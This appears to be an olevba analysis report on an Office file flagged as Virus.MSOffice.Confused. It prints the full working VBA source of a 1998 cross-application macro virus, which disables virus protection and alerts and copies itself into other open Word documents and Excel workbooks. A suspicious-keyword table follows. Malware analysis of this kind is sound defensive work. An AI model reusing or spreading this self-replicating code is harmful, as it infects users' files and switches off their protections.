olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Confused-7184e249eef4779aeedb32116ceb10ea12481220
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSOffice.Confused-7184e249eef4779aeedb32116ceb10ea12481220 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSOffice.Confused-7184e249eef4779aeedb32116ceb10ea12481220 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSOffice.Confused-7184e249eef4779aeedb32116ceb10ea12481220 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSOffice.Confused-7184e249eef4779aeedb32116ceb10ea12481220 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Copyright (C) 1998 by FlyShadow ~^^~ - Confused Memories
Private Sub Document_Close()
On Error Resume Next
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
Application.DisplayAlerts = 0
Application.ScreenUpdating = 0
Application.EnableCancelKey = 0
Set α = ThisDocument.VBProject.VBComponents("ThisDocument").CodeModule
ν = α.CountOfLines + 1: λ = α.Lines(1, ν)
Err.Clear: Set υ = GetObject(, "Excel.Application").VBE.ActiveVBProject.VBComponents("ThisWorkbook").CodeModule
If Err.Number = 0 Then If υ.Find("~^^~", 0, 0, 0, 0, False, False) = False Then ν = υ.CountOfLines + 1: υ.InsertLines ν, λ
For ι = 1 To Documents.Count
If Documents(ι).VBProject.VBComponents(α).CodeModule.Find("~^^~", 0, 0, 0, 0, False, False) = False Then
ν = Documents(ι).VBProject.VBComponents(α).CodeModule.CountOfLines + 1
Documents(ι).VBProject.VBComponents(α).CodeModule.InsertLines ν, λ
End If: Next
End Sub
Private Sub Workbook_Deactivate()
On Error Resume Next
Application.EnableEvents = 1
Application.DisplayAlerts = 0
Application.ScreenUpdating = 0
Application.EnableCancelKey = 0
Set α = ThisWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
ν = α.CountOfLines + 1: λ = α.Lines(1, ν)
Err.Clear: Set υ = GetObject(, "Word.Application").VBE.ActiveVBProject.VBComponents("ThisDocument").CodeModule
If Err.Number = 0 Then If υ.Find("~^^~", 0, 0, 0, 0, False, False) = False Then ν = υ.CountOfLines + 1: υ.InsertLines ν, λ
For ι = 1 To Workbooks.Count
If Workbooks(ι).VBProject.VBComponents(α).CodeModule.Find("~^^~", 0, 0, 0, 0, False, False) = False Then
ν = Workbooks(ι).VBProject.VBComponents(α).CodeModule.CountOfLines + 1
Workbooks(ι).VBProject.VBComponents(α).CodeModule.InsertLines ν, λ
End If: Next
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

